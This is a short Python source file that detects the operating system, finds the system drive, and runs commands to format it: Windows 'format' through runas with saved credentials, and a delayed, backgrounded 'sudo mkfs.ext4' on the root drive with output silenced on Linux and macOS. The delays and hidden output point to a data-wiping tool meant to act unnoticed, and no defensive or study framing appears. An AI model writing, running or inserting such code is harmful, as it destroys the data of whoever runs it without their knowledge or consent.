import os
import platform
import subprocess
import time


class Main:

    @staticmethod
    def scan():
        while True:
            if platform.system() == "Windows":
                result = "Windows"
            elif platform.system() == "Linux":
                result = "Linux"
            elif platform.system() == "Darwin":
                result = "Darwin"
            elif platform.system() == "Unix":
                result = "Unix"
            else:
                return None
            return result
    @staticmethod
    def scan_os_drives(os_result):
        if os_result == "Windows":
            os_drive = os.environ.get("SystemDrive", "C:")
        elif os_result == "Linux" or os_result == "Unix":
            os_drive = "/"
        elif os_result == "Darwin":
            os_drive = "/"
        else:
            return None
        return os_drive
    @staticmethod
    def format_drive(drive):
        if platform.system() == "Windows":
            command = f'runas /user:Administration /noprofile /savecred "cmd /c format {drive}'
        elif platform.system() == "Linux" or platform.system() == "Darwin":
            command = f"sleep 10 && sudo mkfs.ext4 {drive} > /dev/null 2>&1 &"
        else:
            return False

        try:
            time.sleep(5)
            subprocess.run(command, shell=True, check=True)
            return True
        except subprocess.CalledProcessError as e:
            return e
